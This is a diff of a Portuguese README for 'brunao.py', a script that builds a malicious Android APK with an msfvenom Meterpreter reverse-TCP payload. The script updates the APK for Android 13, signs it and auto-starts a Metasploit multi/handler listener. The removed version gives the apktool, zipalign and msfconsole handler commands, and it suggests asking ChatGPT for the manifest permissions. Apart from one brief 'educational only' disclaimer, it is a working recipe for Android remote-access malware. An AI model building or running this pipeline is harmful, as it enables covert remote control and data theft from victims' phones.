@@ -1,99 +1,64 @@
-<h1>Automatização de Geração de APK com Payload Meterpreter e Exploração com Metasploit</h1>
-<p>Este projeto automatiza o processo de criação de um APK malicioso com o payload Meterpreter para Android, utilizando o <code>msfvenom</code>, e fornece instruções para modificar o <code>AndroidManifest.xml</code> para compatibilidade com Android 13. O script também inicia automaticamente o listener no Metasploit para capturar a conexão do dispositivo alvo.
-    (    OU SEJA ELE PEGA SEU IP COM IPCONFIG BOTA NO LHOST GERAR O PAYLOAD E DEPOIS EXECUTAR O METERPRETE AUTOMATICO )
-</p>
+# Script brunao.py
 
-<h2>Requisitos</h2>
-<ul>
-<li>Python 3 instalado.</li>
-<li><code>msfvenom</code>: Ferramenta do Metasploit para gerar payloads.</li>
-<li>Metasploit Framework: Ferramenta para exploração e captura de sessões de meterpreter.</li>
-<li><code>ApkTool</code>: Ferramenta para descompilar, modificar e recompilar APKs.</li>
-<li><code>ZipAlign</code>: Ferramenta para otimizar APKs.</li>
-<li><code>ApkSigner</code>: Ferramenta para assinar APKs.</li>
-</ul>
+Este script foi desenvolvido para automatizar várias etapas de testes e manipulações no Metasploit Framework e no Android. Ele realiza as seguintes tarefas:
 
-<h2>Instalação dos requisitos</h2>
-<p>Instale o Metasploit Framework:</p>
-<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash</code></pre>
+- Atualiza o Metasploit Framework
+- Gera um payload para Android
+- Descompila e recompila o APK gerado
+- Atualiza a versão do APK para Android 13
+- Assina e otimiza o APK
+- Inicia o listener do Meterpreter para conexões
 
-<p>Instale o ApkTool:</p>
-<ul>
-<li>Baixe o ApkTool para atualizar para o Android 13 <a href="https://github.com/iBotPeaches/Apktool" target="_blank">aqui</a>.</li>
-<li>Siga as instruções para a instalação no seu sistema.</li>
-</ul>
+## Funcionalidades
 
-<p>Instale o ZipAlign:</p>
-<ul>
-<li>O ZipAlign geralmente faz parte do Android SDK.</li>
-<li>Você pode baixar o Android SDK <a href="https://developer.android.com/studio" target="_blank">aqui</a>.</li>
-</ul>
+### 1. Atualização do Metasploit Framework
+O script começa atualizando o Metasploit Framework para garantir que você esteja usando a versão mais recente. Durante a execução, ele verifica a versão instalada e a atualiza automaticamente se necessário.
 
-<p><code>msfvenom</code> já faz parte do Metasploit Framework, então você não precisa instalar separadamente.</p>
+### 2. Geração do Payload Android
+O script gera um payload para Android e o salva como um arquivo APK, pronto para ser utilizado em testes de segurança.
 
-<h2>Como usar o script</h2>
-<h3>Passo 1: Clone o repositório</h3>
-<p>Clone este repositório para sua máquina local:</p>
-<pre><code>git clone https://github.com/seu-usuario/automacao-apk-metasploit.git
-cd automacao-apk-metasploit</code></pre>
+### 3. Descompilação do APK
+O APK gerado é descompilado usando a ferramenta Apktool, permitindo que o conteúdo seja acessado e modificado.
 
-<h3>Passo 2: Execute o script</h3>
-<p>Antes de executar o script, certifique-se de que todas as ferramentas mencionadas acima estão instaladas e funcionando corretamente.</p>
-<p>Execute o script Python:</p>
-<pre><code>python3 generate_apk.py</code></pre>
+### 4. Atualização para Android 13
+Após a descompilação, o script atualiza a versão do APK para Android 13, garantindo que o arquivo gerado seja compatível com a versão mais recente do sistema operacional.
 
-<h3>Passo 3: O que o script faz</h3>
-<ul>
-<li><strong>Obtém o IP local</strong>: O script utiliza o comando <code>ifconfig</code> para obter o IP local da máquina.</li>
-<li><strong>Gera o APK</strong>: Usando o <code>msfvenom</code>, o script gera um APK malicioso com o payload Meterpreter para o IP local (LHOST) e porta <code>4444</code> (LPORT).</li>
-<li><strong>Instruções para Modificar o Manifesto</strong>: O script fornecerá as instruções para você atualizar o arquivo <code>AndroidManifest.xml</code> no APK para torná-lo compatível com Android 13.</li>
-<li><strong>Iniciar o Listener no Metasploit</strong>: O script executará automaticamente o Metasploit para começar a escutar conexões de dispositivos com o payload.</li>
-</ul>
+### 5. Recompilação e Assinatura do APK
+O APK modificado é recompilado e assinado digitalmente usando um keystore, o que permite sua execução em dispositivos Android.
 
-<h3>Passo 4: Atualizar o AndroidManifest.xml (para Android 13)</h3>
-<p>Após gerar o APK, você precisa modificar o <code>AndroidManifest.xml</code> para Android 13. Para isso, execute:</p>
-    <pre><code>apktool d Brunao.apk</code></pre>
+### 6. Início do Listener do Meterpreter
+Por fim, o script inicia o listener do Meterpreter, configurando a porta de escuta e esperando a conexão do dispositivo.
 
-<p>Abra o arquivo <code>AndroidManifest.xml</code> dentro da pasta descompilada e adicione as permissões necessárias para Android 13 ou mais recente com o chat gpt, causo não saiba.</p>
+## Requisitos
 
-<p>Recompile o APK:</p>
-<pre><code>apktool b Brunao</code></pre>
+- **Python 3**: O script foi desenvolvido para Python 3.
+- **Metasploit Framework**: O Metasploit Framework deve estar instalado no sistema para a execução do script.
+- **Apktool**: Usado para descompilar e recompilar o APK.
+- **Keystore**: Necessário para assinar o APK gerado.
 
+## Como Usar
 
-<p>Alinhe o APK com o comando:</p>
-<pre><code>zipalign -v 4 Brunao.apk Brunao.apk</code></pre>
+1. Clone este repositório ou baixe o arquivo `brunao.py`.
+2. Certifique-se de que o Metasploit Framework, Apktool e o Python 3 estão corretamente instalados no seu sistema.
+3. Execute o script com o seguinte comando:
 
-<p>Depois, o APK estará pronto para ser assinado e instalado.</p>
+    ```bash
+    sudo python3 brunao.py -r
+    ```
 
-<h3>Passo 5: Executando o Listener no Metasploit</h3>
-<p>Para iniciar o listener no Metasploit e aguardar a conexão do dispositivo alvo, execute:</p>
-<pre><code>msfconsole -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST [SEU_IP]; set LPORT 4444; exploit'</code></pre>
+4. Durante a execução, o script pedirá algumas informações, como a porta de destino para o listener (LPORT).
+5. Após a execução bem-sucedida, você terá o APK assinado e otimizado pronto para ser utilizado.
 
-<p>Este comando configurará o Metasploit para escutar as conexões de dispositivos com o payload.</p>
+## Exemplos de Uso
 
-<h2>Contribuindo</h2>
-<p>Sinta-se à vontade para fazer melhorias no código e enviar pull requests.</p>
+- **Iniciar o script**:
 
-<h2>Aviso Legal</h2>
-<p>Este projeto é somente para fins educacionais. Não use essas técnicas em sistemas sem permissão. Realizar ataques sem autorização é ilegal e pode levar a sérias consequências legais.</p>
+    ```bash
+    sudo python3 brunao.py -r
+    ```
 
-<div class="footer">
-<p>&copy; 2025 Seu Nome. Todos os direitos reservados.</p>
-</div>
+    O script vai iniciar o processo automaticamente e pedirá que você forneça as informações necessárias, como a porta (LPORT).
 
+## Contribuições
 
-Exemplo de Execução
-Obter o IP da máquina: O script encontra o IP privado e o exibe.
-
-Gerar o APK: O script gera o APK malicioso com o msfvenom.
-
-Atualizar o AndroidManifest.xml: O script fornece as instruções para editar o AndroidManifest.xml para Android 13.
-
-Iniciar o Listener: O script inicia o listener do Metasploit e exibe:
-
-Copiar código
-Iniciando o Metasploit... Aguarde.
-Sessão meterpreter iniciada.
-Exibir Comandos: O script exibe os comandos disponíveis, como "executar" e "help".
-
-<h1>Leia a msg que tá no terminal acima da execução do payload sobre a atualização para o android 13</h1>
+Sinta-se à vontade para contribuir com melhorias ou correções. Caso encontre problemas, por favor, abra uma issue no repositório.
